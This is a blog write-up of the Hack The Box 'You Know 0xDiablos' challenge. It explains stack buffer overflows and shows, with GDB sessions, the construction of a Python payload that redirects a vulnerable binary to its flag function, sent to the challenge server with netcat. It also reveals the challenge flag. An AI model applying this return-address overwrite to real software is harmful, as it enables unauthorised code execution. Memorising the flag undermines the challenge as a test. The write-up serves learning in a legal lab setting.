Title: Hack The Box: You Know 0xDiablos
Date: 2023-04-27
Category: Blog
Tags: CTF, Cybersecurity, Hack The Box
Author: Matt Spraggs

I've been steadily working my way through the
[Hack The Box](https://www.hackthebox.com/) Beginner Track, writing each
challenge up here as I go. This is the fifth write-up. So far the challenges
have ranged from
[exploiting well-known vulnerabilities in Windows]({filename}/hack-the-box-lame.md)
to [breaking weak RSA public keys]({filename}/hack-the-box-weak-rsa.md).

# The Challenge

This challenge is a little different to the ones we've covered on the track so
far. We're given a file to download _and_ an IP/port to attack. Downloading the
file, named `vuln`, it looks like a Linux executable:

```shell-session
$ file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=ab7f19bb67c16ae453d4959fba4e6841d930a6dd, for GNU/Linux 3.2.0, not stripped
```

Intriguing... We can use [`objdump`](https://linux.die.net/man/1/objdump) to
examine the executable's symbols:

<div class="highlight"><pre><span></span><code><span class="gp">$ </span>objdump -t vuln

<span class="go">vuln:     file format elf32-i386</span>

<span class="go">SYMBOL TABLE:</span>
<span class="go">...</span>
<span class="go">00000000       F *UND*    00000000              printf@@GLIBC_2.0</span>
<span class="go">00000000       F *UND*    00000000              gets@@GLIBC_2.0</span>
<span class="go">08049391 g     F .text    00000000              .hidden __x86.get_pc_thunk.bp</span>
<span class="go">08049272 g     F .text    0000003f              <b>vuln</b></span>
<span class="go">00000000       F *UND*    00000000              fgets@@GLIBC_2.0</span>
<span class="go">0804c03c g       .data    00000000              _edata</span>
<span class="go">08049398 g     F .fini    00000000              .hidden _fini</span>
<span class="go">...</span>
<span class="go">0804a000 g     O .rodata  00000004              _fp_hw</span>
<span class="go">00000000       O *UND*    00000000              stdout@@GLIBC_2.0</span>
<span class="go">0804c03c g       .bss     00000000              __bss_start</span>
<span class="go">080492b1 g     F .text    00000076              <b>main</b></span>
<span class="go">0804c03c g     O .data    00000000              .hidden __TMC_END__</span>
<span class="go">00000000       F *UND*    00000000              setresgid@@GLIBC_2.0</span>
<span class="go">080491e2 g     F .text    00000090              <b>flag</b></span>
<span class="go">08049000 g     F .init    00000000              .hidden _init</span>
</code></pre></div>

Most of this information isn't very interesting, but there are a few symbols to
note here, which I've highlighted in bold. The first is `main`, the first
function called after the program starts up. If we were writing code in C or
C++, this is the earliest point at which we'd be able to do anything in our
application. We then have a couple of other symbols: `vuln` and `flag`. I'm
going to go out on a limb here and suggest that `flag` might have something to
do with obtaining the flag for this challenge, and `vuln` might be vulnerable to
something in some way.

Let's use `objdump` to look at the assembly of `main` and `vuln`. Within `main`,
we see the following instructions

```shell-session
80492fe:      83 c4 10                   add    esp,0x10
8049301:      83 ec 0c                   sub    esp,0xc
8049304:      8d 83 38 e0 ff ff          lea    eax,[ebx-0x1fc8]
804930a:      50                         push   eax
804930b:      e8 60 fd ff ff             call   8049070 <puts@plt>
8049310:      83 c4 10                   add    esp,0x10
8049313:      e8 5a ff ff ff             call   8049272 <vuln>
8049318:      b8 00 00 00 00             mov    eax,0x0
804931d:      8d 65 f8                   lea    esp,[ebp-0x8]
8049320:      59                         pop    ecx
8049321:      5b                         pop    ebx
8049322:      5d                         pop    ebp
8049323:      8d 61 fc                   lea    esp,[ecx-0x4]
8049326:      c3                         ret
```

The call to [`puts`](https://linux.die.net/man/3/puts) at address `804930b`
should result in a string being printed in the terminal. This is then shortly
followed by a call to one of the other symbols, `vuln`, at address `8049313`.
Let's look at the assembly associated with that symbol:

```shell-session
8049272:      55                         push   ebp
8049273:      89 e5                      mov    ebp,esp
8049275:      53                         push   ebx
8049276:      81 ec b4 00 00 00          sub    esp,0xb4
804927c:      e8 9f fe ff ff             call   8049120 <__x86.get_pc_thunk.bx>
8049281:      81 c3 7f 2d 00 00          add    ebx,0x2d7f
8049287:      83 ec 0c                   sub    esp,0xc
804928a:      8d 85 48 ff ff ff          lea    eax,[ebp-0xb8]
8049290:      50                         push   eax
8049291:      e8 aa fd ff ff             call   8049040 <gets@plt>
8049296:      83 c4 10                   add    esp,0x10
8049299:      83 ec 0c                   sub    esp,0xc
804929c:      8d 85 48 ff ff ff          lea    eax,[ebp-0xb8]
80492a2:      50                         push   eax
80492a3:      e8 c8 fd ff ff             call   8049070 <puts@plt>
80492a8:      83 c4 10                   add    esp,0x10
80492ab:      90                         nop
80492ac:      8b 5d fc                   mov    ebx,DWORD PTR [ebp-0x4]
80492af:      c9                         leave  
80492b0:      c3                         ret    
```

About halfway down the function, there's a call to
[`gets`](https://linux.die.net/man/3/gets), which will read characters from a
file descriptor into a buffer that's pointed to by the pointer in the `eax`
register. This may be an opportunity for a buffer overflow, which would allow us
to manipulate the program into calling the `flag` function.

# Buffer Overflows

At their most fundamental, buffer overflows involve exploiting how the variables
in a function are laid out in memory so that we can influence the behaviour of
the function in a way that wasn't intended. I'll try to summarise the basics
here, but for a more comprehensive introduction I recommend
[Hacking - The Art of Exploitation, 2nd Edition](https://www.amazon.co.uk/Hacking-Art-Exploitation-Jon-Erickson/dp/1593271441)
by Jon Erickson. If you're really lazy then Computerphile give a relatively
succinct introduction in [this](https://www.youtube.com/watch?v=1S0aBV-Waeo)
video.

To give you a rough idea of how they work, consider the following C function:

```c
void trivial_example(const char* src) int {
    int result = 0;
    char buf[200];

    strcpy(buf, src);

    if (strcmp(buf, "the_password") == 0) {
        result = 1;
    }
    return result;
}
```

This function takes a pointer to an array of characters, copies those characters
to a buffer, compares that buffer to an expected password, and returns `0` or
`1` depending on whether the password provided is equal to the expected
password or not.

In memory, the variables local to a function are arranged in the opposite order
to which they're declared. This means that if we walked along memory from lower
addresses to higher addresses, the 200 bytes that make up `buf` would appear
before the four bytes that make up `result`. The reason for this is that local
variables are allocated on the
[stack](https://en.wikipedia.org/wiki/Call_stack), and each time a function is
called that stack grows towards lower memory addresses.

```text
<----------- Direction of stack growth ------
┌────────────────────────────────┬──────────┐
│ buf                            │  result  │
└────────────────────────────────┴──────────┘
------ Increasing memory addresses --------->
------ Older function calls ---------------->
```

The next thing to note is that the code uses `strcpy`. The
[manpage](https://linux.die.net/man/3/strcpy) for `strcpy` starts like this:

```text
STRCPY(3)             Linux Programmer's Manual            STRCPY(3)

NAME
       strcpy, strncpy - copy a string

SYNOPSIS
       #include <string.h>

       char *strcpy(char *dest, const char *src);

       char *strncpy(char *dest, const char *src, size_t n);

DESCRIPTION
       The  strcpy()  function  copies the string pointed to by src,
       including the terminating null byte  ('\0'),  to  the  buffer
       pointed  to  by  dest.   The strings may not overlap, and the
       destination string dest must be large enough to  receive  the
       copy.  Beware of buffer overruns!  (See BUGS.)

...
```

`strcpy` will go through the bytes pointed to by the source pointer and keep
copying them to the destination buffer until it hits a null byte, _regardless of
how large the destination buffer is_.

Putting this information together, this means that if the bytes pointed to by
`src` don't contain a null character within the first 200 bytes, whatever comes
after the first 200 bytes will be written in to the other variables in
`trivial_example`, namely the `result` flag. This would allow us to manipulate
the value of `result` in a way other than how the function author intended.

Taking this further, the way that memory is laid out in x86 processor means that
a function's return address sits after all the variables that are local to a
function. The return address is the memory address of the next instruction that
the CPU should execute after the function returns. Returning to the diagram
above, memory for a particular function is laid out like this:

```text
<---------------------------- Direction of stack growth ------
┌────────────────────────────────┬──────────┬────────────────┐
│ buf                            │  result  │ return address │
└────────────────────────────────┴──────────┴────────────────┘
------ Increasing memory addresses -------------------------->
------ Older function calls --------------------------------->
```

The implications here are pretty major. If we have some place in memory we want
to execute, we can tack the bytes of the corresponding memory address onto
whatever is copied into `buf` so that when the function returns, control is
passed to the memory address we want.

# Putting it Into Practice

Earlier I mentioned that the `vuln` might be vulnerable to a stack overflow
because it contains a call to `gets`. Let's look at the manpage for `gets`:

```text
GETS(3)               Linux Programmer's Manual              GETS(3)

NAME
       gets - get a string from standard input (DEPRECATED)

SYNOPSIS
       #include <stdio.h>

       char *gets(char *s);

DESCRIPTION
       Never use this function.

       gets()  reads a line from stdin into the buffer pointed to by
       s until either a terminating newline or  EOF,  which  it  re‐
       places  with a null byte ('\0').  No check for buffer overrun
       is performed (see BUGS below).

...
```

Looks pretty similar to `strcpy`, and in fact it's worse than `strcpy` because
we're explicitly told not to use this function. This is the chink in the armour
we need to exploit.

Let's have a look at how the program behaves using GDB:

```shell-session
$ gdb -q ./vuln
Reading symbols from ./vuln...
(No debugging symbols found in ./vuln)
(gdb) set disassembly-flavor intel
(gdb) disass main
Dump of assembler code for function main:
   0x080492b1 <+0>:    lea    ecx,[esp+0x4]
   0x080492b5 <+4>:    and    esp,0xfffffff0
   0x080492b8 <+7>:    push   DWORD PTR [ecx-0x4]
   0x080492bb <+10>:   push   ebp
   0x080492bc <+11>:   mov    ebp,esp
   0x080492be <+13>:   push   ebx
   0x080492bf <+14>:   push   ecx
   0x080492c0 <+15>:   sub    esp,0x10
   0x080492c3 <+18>:   call   0x8049120 <__x86.get_pc_thunk.bx>
   0x080492c8 <+23>:   add    ebx,0x2d38
   0x080492ce <+29>:   mov    eax,DWORD PTR [ebx-0x4]
   0x080492d4 <+35>:   mov    eax,DWORD PTR [eax]
   0x080492d6 <+37>:   push   0x0
   0x080492d8 <+39>:   push   0x2
   0x080492da <+41>:   push   0x0
   0x080492dc <+43>:   push   eax
   0x080492dd <+44>:   call   0x80490a0 <setvbuf@plt>
   0x080492e2 <+49>:   add    esp,0x10
   0x080492e5 <+52>:   call   0x8049060 <getegid@plt>
   0x080492ea <+57>:   mov    DWORD PTR [ebp-0xc],eax
   0x080492ed <+60>:   sub    esp,0x4
   0x080492f0 <+63>:   push   DWORD PTR [ebp-0xc]
   0x080492f3 <+66>:   push   DWORD PTR [ebp-0xc]
   0x080492f6 <+69>:   push   DWORD PTR [ebp-0xc]
   0x080492f9 <+72>:   call   0x80490c0 <setresgid@plt>
   0x080492fe <+77>:   add    esp,0x10
   0x08049301 <+80>:   sub    esp,0xc
   0x08049304 <+83>:   lea    eax,[ebx-0x1fc8]
   0x0804930a <+89>:   push   eax
   0x0804930b <+90>:   call   0x8049070 <puts@plt>
   0x08049310 <+95>:   add    esp,0x10
   0x08049313 <+98>:   call   0x8049272 <vuln>
   0x08049318 <+103>:  mov    eax,0x0
   0x0804931d <+108>:  lea    esp,[ebp-0x8]
   0x08049320 <+111>:  pop    ecx
   0x08049321 <+112>:  pop    ebx
   0x08049322 <+113>:  pop    ebp
   0x08049323 <+114>:  lea    esp,[ecx-0x4]
   0x08049326 <+117>:  ret    
End of assembler dump.
(gdb)
```

`vuln` is called at `main+98`, or `0x08049313`. Let's set a breakpoint there and
try running the program.

```shell-session
(gdb) break *0x08049313
Breakpoint 1 at 0x8049313
(gdb) run
Starting program: vuln 
You know who are 0xDiablos: 

Breakpoint 1, 0x08049313 in main ()
(gdb)
```

Now, let's see what happens to the top of the stack as we follow the call to
`vuln`:

```shell-session
(gdb) x/wx $esp
0xffffcde0:    0x00000001
(gdb) si
0x08049272 in vuln ()
(gdb) x/wx $esp
0xffffcddc:    0x08049318
(gdb)
```

Before the call, the top of the stack, which is denoted by the ESP register, or
stack pointer, contains the value 1. After the call, it contains the memory
address of the instruction immediately following the call, `0x08049318`. This is
the value we need to overwrite with our buffer overflow.

Next, let's see how the stack changes as we progress through this function.
We're currently at the very beginning of the assembly for `vuln`:

```shell-session
(gdb) disass
Dump of assembler code for function vuln:
=> 0x08049272 <+0>:   push   ebp
   0x08049273 <+1>:   mov    ebp,esp
   0x08049275 <+3>:   push   ebx
   0x08049276 <+4>:   sub    esp,0xb4
   0x0804927c <+10>:  call   0x8049120 <__x86.get_pc_thunk.bx>
   0x08049281 <+15>:  add    ebx,0x2d7f
   0x08049287 <+21>:  sub    esp,0xc
   0x0804928a <+24>:  lea    eax,[ebp-0xb8]
   0x08049290 <+30>:  push   eax
   0x08049291 <+31>:  call   0x8049040 <gets@plt>
   0x08049296 <+36>:  add    esp,0x10
   0x08049299 <+39>:  sub    esp,0xc
   0x0804929c <+42>:  lea    eax,[ebp-0xb8]
   0x080492a2 <+48>:  push   eax
   0x080492a3 <+49>:  call   0x8049070 <puts@plt>
   0x080492a8 <+54>:  add    esp,0x10
   0x080492ab <+57>:  nop
   0x080492ac <+58>:  mov    ebx,DWORD PTR [ebp-0x4]
   0x080492af <+61>:  leave  
   0x080492b0 <+62>:  ret    
End of assembler dump.
(gdb)
```

Let's set a breakpoint at the instruction that calls `gets` and see what the
stack looks like.

<div class="highlight"><pre><span></span><code><span class="gp gp-VirtualEnv">(gdb)</span> <span class="go">break *0x08049291</span>
<span class="go">Breakpoint 2 at 0x8049291</span>
<span class="gp gp-VirtualEnv">(gdb)</span> <span class="go">c</span>
<span class="go">Continuing.</span>

<span class="go">Breakpoint 2, 0x08049291 in vuln ()</span>
<span class="gp gp-VirtualEnv">(gdb)</span> <span class="go">i r ebp</span>
<span class="go">ebp            0xffffcdd8          0xffffcdd8</span>
<span class="gp gp-VirtualEnv">(gdb)</span> <span class="go">i r esp</span>
<span class="go">esp            0xffffcd10          0xffffcd10</span>
<span class="gp gp-VirtualEnv">(gdb)</span> <span class="go">i r eax</span>
<span class="go">eax            0xffffcd20          -13024</span>
<span class="gp gp-VirtualEnv">(gdb)</span> <span class="go">p $ebp - $esp</span>
<span class="gp">$</span><span class="nv">1</span> <span class="o">=</span> <span class="m">200</span>
<span class="gp gp-VirtualEnv">(gdb)</span> <span class="go">p/d $ebp - $eax</span>
<span class="gp">$</span><span class="nv">2</span> <span class="o">=</span> <span class="m">184</span>
<span class="gp gp-VirtualEnv">(gdb)</span> <span class="go">x/60xw $esp</span>
<span class="go"><b>0xffffcd10</b>:    0xffffcd20    0xf7f9bd67    0x00000001    0x08049281</span>
<span class="go"><b>0xffffcd20</b>:    0xf7f9bd20    0x000007d4    0x00000001    0xf7dba7cc</span>
<span class="go">0xffffcd30:    0xf7fca110    0x000007d4    0x0000001c    0x00000001</span>
<span class="go">0xffffcd40:    0x0000000a    0x0000001c    0xffffcdc8    0xf7e29aef</span>
<span class="go">0xffffcd50:    0xf7f9bd20    0x0000001c    0xf7f9bd20    0xf7e29f83</span>
<span class="go">0xffffcd60:    0xf7f9bd20    0xf7f9bd67    0x00000001    0x00000001</span>
<span class="go">0xffffcd70:    0x00000001    0x00000000    0xf7e2aaed    0xf7f99960</span>
<span class="go">0xffffcd80:    0xf7f9bd20    0x0000001c    0xffffcdc8    0xf7e1ddeb</span>
<span class="go">0xffffcd90:    0xf7f9bd20    0x0000000a    0x0000001c    0xf7e7a4b1</span>
<span class="go">0xffffcda0:    0x00000000    0xf7f9b000    0xf7f9bdbc    0x0000001c</span>
<span class="go">0xffffcdb0:    0xffffcdf8    0xf7fe7ae4    0x000003e8    0x0804c000</span>
<span class="go">0xffffcdc0:    0xf7f9b000    0xf7f9b000    0xffffcdf8    0x08049310</span>
<span class="go">0xffffcdd0:    0x0804a038    0x0804c000    0xffffcdf8    <b>0x08049318</b></span>
<span class="go">0xffffcde0:    0x00000001    0xffffcea4    0xffffceac    0x000003e8</span>
<span class="go">0xffffcdf0:    0xffffce10    0x00000000    0x00000000    0xf7dcaed5</span>
<span class="gp gp-VirtualEnv">(gdb)</span>
</code></pre></div>

Right before `gets` is called, the current stack frame is 200 bytes in size. The
buffer written to by `gets` starts at `0xffffcd20`, sixteen bytes from the start
of the stack frame, `0xffffcd10`. I've also highlighted the return address we
want to overwrite, `0x08049318`, which sits at address `0xffffcddc`. If we want
to overwrite this address, we'll need to provide a string that's at least 188
bytes long (the difference between `0xffffcd20` and `0xffffcddc`). Let's
continue and see what happens when we do this.

```shell-session
(gdb) ni
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
0x08049296 in vuln ()
(gdb) x/60xw $esp
0xffffcd10:    0xffffcd20    0xf7f9bd67    0x00000001    0x08049281
0xffffcd20:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffcd30:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffcd40:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffcd50:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffcd60:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffcd70:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffcd80:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffcd90:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffcda0:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffcdb0:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffcdc0:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffcdd0:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffcde0:    0x00000000    0xffffcea4    0xffffceac    0x000003e8
0xffffcdf0:    0xffffce10    0x00000000    0x00000000    0xf7dcaed5
(gdb)
```

Success! The return address has been overwritten with `0x41414141`, the ASCII
representation of "AAAA". Immediately following these four bytes, the word at
`0xffffcde0` has changed from `0x00000001` to `0x00000000`, since the null byte
terminating the input string has been copied to this address.

The next challenge is constructing a payload including the address we want the
CPU to execute in place of the return address. Once again, we can use GDB to get
this info:

```shell-session
(gdb) p flag
$6 = {<text variable, no debug info>} 0x80491e2 <flag>
(gdb)
```

So our payload needs to be terminated with the bytes `0x08`, `0x04`, `0x91` and
`0xe2`. Because x86 CPUs use little-endian
[byte order](https://en.wikipedia.org/wiki/Endianness), our payload needs to
provide these in the opposite order to how they appear here. We can use Python
to help us construct this payload:

```python
payload = b"A" * 188 + b"\xe2\x91\x04\x08"
with open("payload.bin", "wb") as f:
    f.write(payload)
```

We can then test this out in GDB by piping the file into the vulnerable process:

```shell-session
(gdb) run < payload.bin
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: vuln < payload.bin
You know who are 0xDiablos: 

Breakpoint 1, 0x08049313 in main ()
(gdb) c
Continuing.

Breakpoint 2, 0x08049291 in vuln ()
(gdb) ni
0x08049296 in vuln ()
(gdb) x/60xw $esp
0xffffcd10:    0xffffcd20    0xf7f9bd67    0x00000001    0x08049281
0xffffcd20:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffcd30:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffcd40:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffcd50:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffcd60:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffcd70:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffcd80:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffcd90:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffcda0:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffcdb0:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffcdc0:    0x41414141    0x41414141    0x41414141    0x41414141
0xffffcdd0:    0x41414141    0x41414141    0x41414141    0x080491e2
0xffffcde0:    0x00000000    0xffffcea4    0xffffceac    0x000003e8
0xffffcdf0:    0xffffce10    0x00000000    0x00000000    0xf7dcaed5
(gdb)
```

Looks good so far. Let's set a breakpoint in `flag` and see whether we hit it:

```shell-session
(gdb) break flag
Breakpoint 3 at 0x80491e6
(gdb) c
Continuing.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�

Breakpoint 3, 0x080491e6 in flag ()
(gdb)
```

Great! We've managed to coerce the program into passing control to the `flag`
function. Let's continue and see what happens...

```shell-session
(gdb) 
Continuing.
Hurry up and try in on server side.
[Inferior 1 (process 27985) exited normally]
(gdb)
(gdb)
```

Interesting! Looks like `flag` can tell we're running the binary locally. To
understand what's going on, let's disassemble the `flag` symbol in GDB:

```shell-session
(gdb) disass flag
Dump of assembler code for function flag:
   0x080491e2 <+0>:    push   ebp
   0x080491e3 <+1>:    mov    ebp,esp
   0x080491e5 <+3>:    push   ebx
   0x080491e6 <+4>:    sub    esp,0x54
   0x080491e9 <+7>:    call   0x8049120 <__x86.get_pc_thunk.bx>
   0x080491ee <+12>:   add    ebx,0x2e12
   0x080491f4 <+18>:   sub    esp,0x8
   0x080491f7 <+21>:   lea    eax,[ebx-0x1ff8]
   0x080491fd <+27>:   push   eax
   0x080491fe <+28>:   lea    eax,[ebx-0x1ff6]
   0x08049204 <+34>:   push   eax
   0x08049205 <+35>:   call   0x80490b0 <fopen@plt>
   0x0804920a <+40>:   add    esp,0x10
   0x0804920d <+43>:   mov    DWORD PTR [ebp-0xc],eax
   0x08049210 <+46>:   cmp    DWORD PTR [ebp-0xc],0x0
   0x08049214 <+50>:   jne    0x8049232 <flag+80>
   0x08049216 <+52>:   sub    esp,0xc
   0x08049219 <+55>:   lea    eax,[ebx-0x1fec]
   0x0804921f <+61>:   push   eax
   0x08049220 <+62>:   call   0x8049070 <puts@plt>
   0x08049225 <+67>:   add    esp,0x10
   0x08049228 <+70>:   sub    esp,0xc
   0x0804922b <+73>:   push   0x0
   0x0804922d <+75>:   call   0x8049080 <exit@plt>
   0x08049232 <+80>:   sub    esp,0x4
   0x08049235 <+83>:   push   DWORD PTR [ebp-0xc]
   0x08049238 <+86>:   push   0x40
   0x0804923a <+88>:   lea    eax,[ebp-0x4c]
   0x0804923d <+91>:   push   eax
   0x0804923e <+92>:   call   0x8049050 <fgets@plt>
   0x08049243 <+97>:   add    esp,0x10
   0x08049246 <+100>:  cmp    DWORD PTR [ebp+0x8],0xdeadbeef
   0x0804924d <+107>:  jne    0x8049269 <flag+135>
   0x0804924f <+109>:  cmp    DWORD PTR [ebp+0xc],0xc0ded00d
   0x08049256 <+116>:  jne    0x804926c <flag+138>
   0x08049258 <+118>:  sub    esp,0xc
   0x0804925b <+121>:  lea    eax,[ebp-0x4c]
   0x0804925e <+124>:  push   eax
   0x0804925f <+125>:  call   0x8049030 <printf@plt>
   0x08049264 <+130>:  add    esp,0x10
   0x08049267 <+133>:  jmp    0x804926d <flag+139>
   0x08049269 <+135>:  nop
   0x0804926a <+136>:  jmp    0x804926d <flag+139>
   0x0804926c <+138>:  nop
   0x0804926d <+139>:  mov    ebx,DWORD PTR [ebp-0x4]
   0x08049270 <+142>:  leave  
   0x08049271 <+143>:  ret    
End of assembler dump.
(gdb)
```

There's quite a lot going on here, so let's focus on the important bits one at a
time. The function calls [`fopen`](https://linux.die.net/man/3/fopen), which
opens a file and returns a handle to it. Let's put a breakpoint at the call site
and see what's being provided to `fopen`.

```shell-session
(gdb) break *0x08049205
Breakpoint 4 at 0x8049205
(gdb) c
Continuing.

Breakpoint 4, 0x08049205 in flag ()
(gdb) x/s $eax
0x804a00a:    "flag.txt"
(gdb)
```

`fopen` accepts two arguments: the path to the file and the mode to open the
file in. Both of these are pointers to byte arrays, and both are provided on the
stack. Because of the Linux x86
[calling convention](https://en.wikipedia.org/wiki/X86_calling_conventions),
the first argument will be at the top of the stack. In fact, in this case the
value still exists in the `eax` register by the time we hit the `call`
instruction. Examining the memory pointed to by the `eax` register indicates
that the file passed to `fopen` is called `flag.txt`.

Shortly after `fopen` is called, the value it returns is checked to see if it is
null, at which point the function branches. Let's put a dummy `flag.txt` file in
our local directory and try our exploit again...

```shell-session
$ echo foobarbaz > flag.txt
$ gdb -q ./vuln
Reading symbols from ./vuln...
(No debugging symbols found in ./vuln)
(gdb) run < payload.bin 
Starting program: vuln < payload.bin
You know who are 0xDiablos: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�

Program received signal SIGSEGV, Segmentation fault.
0x00000000 in ?? ()
(gdb)
```

Oof, it's still not working. Let's return to the assembly for `flag` to find out
what's going wrong. After the `flag.txt` file is opened successfully, there's a
call to `puts`. That explains why our payload is printed to the screen. This is
followed by a call to [`fgets`](https://linux.die.net/man/3/fgets), suggesting
the file contents are being read. Next, the function compares a couple of memory
addresses to two four-byte words (_DWORDs_): `0xdeadbeef` and `0xc0ded00d`. If
these comparisons are true, then the function calls `printf`, printing the flag
loaded from `flag.txt` to the console.

The two `cmp` instructions take the memory addresses `ebp+0x8` and `ebp+0xc` as
arguments. We can calculate what these addresses are using GDB:

```shell-session
(gdb) break *0x08049246
Breakpoint 1 at 0x8049246
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: vuln < payload.bin
You know who are 0xDiablos: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�

Breakpoint 1, 0x08049246 in flag ()
(gdb) i r ebp
ebp            0xffffcddc          0xffffcddc
(gdb) p/x $ebp+0x8
$1 = 0xffffcde4
(gdb) p/x $ebp+0xc
$2 = 0xffffcde8
(gdb)
```

Our payload starts at address `0xffffcd20`, so these memory addresses suggest we
should include the bytes `0xdeadbeef` 196 bytes from the start of our payload
and `0xc0ded00d` in the four bytes immediately after. With this info in hand, we
can return to Python to construct our new payload:

```python
payload = (
    b"A" * 188 +
    b"\xe2\x91\x04\x08" +
    b"A" * 4 +
    b"\xef\xbe\xad\xde" +
    b"\x0d\xd0\xde\xc0"
)
with open("payload.bin", "wb") as f:
    f.write(payload)
```

Let's try this payload again...

```shell-session
(gdb) run < payload.bin
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: vuln < payload.bin
You know who are 0xDiablos: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�

Breakpoint 1, 0x08049246 in flag ()
(gdb) c
Continuing.
foobarbaz

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb)
```

Nice! Our dummy flag was printed to the console.

The next step is to feed this payload to the process running on the remote
machine. We can do this using [netcat](https://en.wikipedia.org/wiki/Netcat):

```shell-session
$ cat payload.bin | nc 138.68.170.205 32570
You know who are 0xDiablos: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
HTB{0ur_Buff3r_1s_not_healthy}
```

Awesome! We have the flag ✊🏻

I absolutely loved this challenge, mainly because it required a bit of technical
knowledge and problem-solving to complete. The fact that it forces you to
understand how data is passed around a program really appeals to me. The next
box, _Netmon_, also requires a bit problem solving, but nothing quite as
in-depth as this.
